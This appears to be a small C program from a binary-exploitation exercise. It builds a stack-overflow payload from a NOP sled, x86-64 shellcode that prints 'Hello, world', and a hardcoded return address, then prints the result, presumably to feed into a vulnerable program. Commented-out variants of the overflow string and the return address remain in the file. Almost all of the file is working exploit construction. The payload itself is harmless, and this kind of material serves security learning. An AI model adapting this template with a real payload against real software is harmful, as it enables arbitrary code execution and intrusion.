#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main()
{
  /*char sploit[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x56\xe4\xff\xff\xff\x7f";*/

  char *printme;

  /* hello world */
  /*char shellcode[] = "\x48\xc7\xc0\xff\xff\xff\x0f\x48\x2d\xfe\xff\xff\x0f\x48\x89\xc7"
    "\x48\xc7\xc6\xff\xff\xff\x0f\x48\x81\xee\x47\xff\xbf\x0f\x48\xc7\xc2\xff\xff\xff\x0f"
    "\x48\x81\xea\xf2\xff\xff\x0f\x0f\x05\x48\xc7\xc0\xff\xff\xff\x0f\x48\x2d\xc3\xff\xff"
    "\x0f\x48\x31\xff\x0f\x05\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x0a\x56\xe4\xff\xff\xff\x7f";*/

  /* hello world */
  char shellcode[] =
  "\xeb\x33\x48\xc7\xc0\xff\xff\xff\x0f\x48\x2d\xfe\xff\xff\x0f"
  "\x48\x89\xc7\x5e\x48\xc7\xc2\xff\xff\xff\x0f\x48\x81\xea\xf2"
  "\xff\xff\x0f\x0f\x05\x48\xc7\xc0\xff\xff\xff\x0f\x48\x2d\xc3"
  "\xff\xff\x0f\x48\x31\xff\x0f\x05\xe8\xc8\xff\xff\xff\x48\x65"
  "\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x0a\x6a\xe4\xff\xff\xff\x7f";


  /* return address */
  /*char retaddr[] = "\x56\xe4\xff\xff\xff\x7f";*/

  printme = (char *)malloc(512*sizeof(char));
  /*pad with NOPs*/
  memset(printme,0x90,(264-strlen(shellcode)));
  /*printf("Length of shellcode: %d\n",strlen(shellcode));*/
  printme[264-strlen(shellcode)] = '\0';
  /*printf("Length of printme: %d\n",strlen(printme));*/
  strcat(printme,shellcode);
  /*strcat(printme,retaddr);*/

  printf("%s",printme);

  return 0;
}
